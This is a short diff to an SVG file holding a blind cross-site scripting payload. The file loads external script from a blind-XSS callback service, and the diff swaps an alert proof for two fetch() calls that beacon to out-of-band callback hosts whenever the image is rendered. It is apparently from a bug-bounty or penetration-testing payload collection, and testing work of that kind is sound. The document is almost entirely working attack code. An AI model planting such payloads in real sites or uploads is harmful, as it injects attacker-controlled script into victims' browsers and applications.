@@ -1,6 +1,7 @@
 <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
   <script type="text/javascript"  xlink:href="https://td.bxss.in"></script>
   <script type="text/javascript">
-    alert("XSS by LTIDI");
+    fetch("https://eo1m2pa72iiq3t9.m.pipedream.net/blindxss.svg");
+    fetch("https://cp6ncglqburjov5thgegu489rxikay6en.oast.live/blindxss.svg");
   </script>
 </svg>
